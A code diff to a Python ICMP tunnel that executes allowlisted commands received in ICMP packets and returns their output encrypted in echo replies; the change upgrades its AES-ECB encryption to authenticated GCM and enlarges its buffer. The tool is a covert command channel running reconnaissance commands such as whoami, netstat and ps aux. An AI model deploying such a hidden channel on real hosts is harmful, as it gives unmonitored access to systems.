@@ -1,6 +1,7 @@
 import hashlib
 import logging
 import os
+import secrets
 import shlex
 import socket
 import struct
@@ -15,9 +16,11 @@ try:
     from .logging_config import configure, get_logger  # noqa: F401
 except ImportError:
     from logging_config import configure
-from Crypto.Util.Padding import pad, unpad
 
 ICMP_COMMAND_TIMEOUT = 5
+ICMP_BUFFER_SIZE = 4096
+AES_NONCE_LENGTH = 12
+AES_TAG_LENGTH = 16
 ALLOWED_ICMP_COMMANDS = frozenset({
     "id", "whoami", "hostname", "uname -a", "ip addr", "ip route",
     "ifconfig", "netstat -tlnp", "ps aux", "ls", "pwd", "cat /etc/hostname",
@@ -34,13 +37,42 @@ def check_sudo():
 
 if __name__ == "__main__":
     check_sudo()
-def decrypt_data(data, key):
-    cipher = AES.new(key, AES.MODE_ECB)
-    return unpad(cipher.decrypt(data), AES.block_size)
-
 def encrypt_data(data, key):
-    cipher = AES.new(key, AES.MODE_ECB)
-    return cipher.encrypt(pad(data.encode(), AES.block_size))
+    """Encrypt bytes with AES-256-GCM returning ``nonce || ciphertext || tag``.
+
+    Args:
+        data: Plaintext bytes to encrypt.
+        key: 32-byte AES-256 key.
+
+    Returns:
+        Concatenated nonce, ciphertext and authentication tag.
+    """
+    nonce = secrets.token_bytes(AES_NONCE_LENGTH)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+    return nonce + ciphertext + tag
+
+
+def decrypt_data(data, key):
+    """Decrypt bytes produced by ``encrypt_data`` after authenticating them.
+
+    Args:
+        data: ``nonce || ciphertext || tag`` payload.
+        key: 32-byte AES-256 key.
+
+    Returns:
+        Decrypted plaintext bytes.
+
+    Raises:
+        ValueError: If the payload is malformed or the tag fails to verify.
+    """
+    if len(data) < AES_NONCE_LENGTH + AES_TAG_LENGTH:
+        raise ValueError("payload too short to contain nonce and tag")
+    nonce = data[:AES_NONCE_LENGTH]
+    tag = data[-AES_TAG_LENGTH:]
+    ciphertext = data[AES_NONCE_LENGTH:-AES_TAG_LENGTH]
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag)
 
 def execute_command(command):
     try:
@@ -65,7 +97,7 @@ def send_icmp_reply(sock, addr, data, key):
 
     # Comprimir y encriptar los datos
     compressed_data = zlib.compress(data.encode())
-    encrypted_data = encrypt_data(compressed_data.decode('latin-1'), key)
+    encrypted_data = encrypt_data(compressed_data, key)
 
     # Crear el encabezado del ICMP Echo Reply (tipo 0)
     header = struct.pack('bbHHh', 0, 0, 0, packet_id, 1)
@@ -137,7 +169,7 @@ def listen_for_icmp(interface, key):
         try:
             while True:
                 logging.info("Esperando paquetes ICMP...")
-                packet, addr = sock.recvfrom(1024)  # Aquí esperas por un paquete ICMP
+                packet, addr = sock.recvfrom(ICMP_BUFFER_SIZE)  # Aquí esperas por un paquete ICMP
                 logging.info(f"Paquete recibido de {addr[0]}")
                 # Enviar tarea al pool de hilos sin bloquear
                 executor.submit(handle_packet, packet, addr, key, sock)
